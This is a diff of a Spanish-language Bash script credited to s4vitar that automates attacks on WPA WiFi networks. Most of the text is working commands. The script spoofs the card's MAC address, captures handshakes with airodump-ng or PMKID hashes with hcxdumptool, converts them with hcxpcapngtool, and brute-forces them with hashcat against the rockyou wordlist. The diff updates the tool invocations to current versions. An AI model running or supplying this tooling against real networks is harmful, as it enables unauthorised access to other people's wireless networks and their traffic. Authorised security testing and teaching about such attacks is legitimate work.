@@ -1,6 +1,8 @@
 #!/bin/bash
 
 # Author: s4vitar - nmap y pa' dentro
+# Last Update: Ene 2024
+# Tested on : Kali 6.5.0-kali3-amd64
 
 #Colours
 greenColour="\e[0;32m\033[1m"
@@ -18,7 +20,7 @@ trap ctrl_c INT
 
 function ctrl_c(){
 	echo -e "\n${yellowColour}[*]${endColour}${grayColour}Saliendo${endColour}"
-	tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
+	tput cnorm; airmon-ng stop ${networkCard} > /dev/null 2>&1
 	rm Captura* 2>/dev/null
 	exit 0
 }
@@ -59,14 +61,14 @@ function startAttack(){
 		clear
 		echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando tarjeta de red...${endColour}\n"
 		airmon-ng start $networkCard > /dev/null 2>&1
-		ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
-		ifconfig ${networkCard}mon up; killall dhclient wpa_supplicant 2>/dev/null
+		ifconfig ${networkCard} down && macchanger -a ${networkCard} > /dev/null 2>&1
+		ifconfig ${networkCard} up; killall dhclient wpa_supplicant 2>/dev/null
 
-		echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva dirección MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"
+		echo -e "${yellowColour}[*]${endColour}${grayColour} Nueva dirección MAC asignada ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${networkCard} | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"
 
 	if [ "$(echo $attack_mode)" == "Handshake" ]; then
 
-		xterm -hold -e "airodump-ng ${networkCard}mon" &
+		xterm -hold -e "airodump-ng ${networkCard}" &
 		airodump_xterm_PID=$!
 		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso: ${endColour}" && read apName
 		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Canal del punto de acceso: ${endColour}" && read apChannel
@@ -88,10 +90,11 @@ function startAttack(){
 	elif [ "$(echo $attack_mode)" == "PKMID" ]; then
 		clear; echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ClientLess PKMID Attack...${endColour}\n"
 		sleep 2
-		timeout 60 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura"
+		timeout 60 bash -c "hcxdumptool -i ${networkCard}mon -w Captura"
 		echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
 		sleep 2
-		hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null
+		#hcxpcaptool -z myHashes Captura; rm Captura 2>/dev/null
+                hcxpcapngtool --log=myHashes.log -o myHashes Captura
 
 		test -f myHashes
 
@@ -99,7 +102,7 @@ function startAttack(){
 			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando proceso de fuerza bruta...${endColour}\n"
 			sleep 2
 
-			hashcat -m 16800 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
+			hashcat -m 22000 myHashes /usr/share/wordlists/rockyou.txt -d 1 --force
 		else
 			echo -e "\n${redColour}[!]${endColour}${grayColour} No se ha podido capturar el paquete necesario...${endColour}\n"
 			rm Captura* 2>/dev/null
@@ -126,7 +129,7 @@ if [ "$(id -u)" == "0" ]; then
 	else
 		dependencies
 		startAttack
-		tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
+		tput cnorm; airmon-ng stop ${networkCard} > /dev/null 2>&1
 	fi
 else
 	echo -e "\n${redColour}[*] No soy root${endColour}\n"
